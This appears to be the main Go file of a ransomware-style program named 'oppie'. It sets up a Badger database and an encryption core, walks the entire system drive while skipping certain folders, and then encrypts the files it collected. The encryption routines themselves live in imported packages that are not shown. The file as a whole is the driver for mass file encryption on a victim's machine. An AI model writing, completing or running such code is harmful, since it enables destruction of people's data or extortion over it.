package main

import (
	"fmt"
	"time"

	"github.com/savi2w/oppie/encrypt"
	"github.com/savi2w/oppie/osutil"
	"github.com/savi2w/oppie/storage"
	"github.com/savi2w/oppie/traversal"
)

func main() {
	badger, err := storage.New()
	if err != nil {
		panic(err)
	}

	core, err := encrypt.New()
	if err != nil {
		panic(err)
	}

	traversal := traversal.New(badger, core)

	drive := osutil.GetSystemDrive()
	ignore := osutil.GetIgnoreFolders()

	traversal.Walker.WaitGroup.Add(1)
	traversal.Walker.Walk(drive, ignore)
	traversal.Walker.WaitGroup.Wait()

	fmt.Println("Done walking...")

	traversal.Encryptor.Iterate()
	traversal.Encryptor.WaitGroup.Wait()

	fmt.Println("Done iterating...")

	// For some reason defer is giving me a error
	time.Sleep(16 * time.Second)
	badger.Close()
}
